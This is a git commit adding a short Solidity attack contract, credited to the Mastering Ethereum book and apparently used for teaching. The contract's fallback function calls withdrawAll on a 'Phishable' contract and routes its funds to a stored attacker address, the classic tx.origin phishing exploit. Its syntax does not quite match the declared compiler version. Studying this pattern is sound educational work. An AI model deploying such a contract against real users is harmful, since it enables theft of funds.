43cab33c2a549f6d0195549f8779a5811b0866dc
samirasrh <Samira.Briongos.extern@srh-hochschulen.de>
2024-11-22 09:41:45 +0100

    Update AttackContract.sol

--- AttackContract.sol
+++ AttackContract.sol
@@ -1,1 +1,22 @@
+// SPDX-License-Identifier: CC-BY-SA-4.0
 
+//Example from the Mastering Ethereum book
+// Version of Solidity compiler this program was written for
+pragma solidity ^0.6.4;
+
+import "Phishable.sol";
+
+contract AttackContract {
+
+    Phishable phishableContract;
+    address attacker; // The attacker's address to receive funds
+
+    constructor (Phishable _phishableContract, address _attackerAddress) {
+        phishableContract = _phishableContract;
+        attacker = _attackerAddress;
+    }
+
+    function () payable {
+        phishableContract.withdrawAll(attacker);
+    }
+}
